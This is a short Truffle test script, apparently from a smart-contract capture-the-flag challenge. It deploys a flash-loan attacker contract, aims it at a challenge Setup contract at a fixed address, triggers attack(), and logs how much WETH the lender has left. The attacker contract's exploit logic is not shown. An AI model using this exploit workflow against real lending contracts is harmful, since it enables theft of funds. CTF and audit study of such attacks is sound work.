const Setup = artifacts.require("Setup");
const FlashLoanAttacker = artifacts.require("FlashLoanAttacker");

let setUpcontractAddr = "0xfDd53b9E8A642049843343C2D66de64f6356026B";

describe("Test", () => {
  it("Test", async () => {
    let setupContract = await Setup.at(setUpcontractAddr);
    let setupContractAddr = setupContract.address;
    console.log("setupContractAddr", setupContractAddr);

    let flashloanAttackerContract = await FlashLoanAttacker.deployed();
    let attackContractAddr = flashloanAttackerContract.address;
    console.log("attackContractAddr", attackContractAddr);

    await flashloanAttackerContract.setAddr(setupContractAddr);

    await flashloanAttackerContract.attack();
    console.log("attack done");

    let remain = await flashloanAttackerContract.getLenderRemainWeth();
    console.log("remaining weth", web3.utils.fromWei(remain));
  });
});
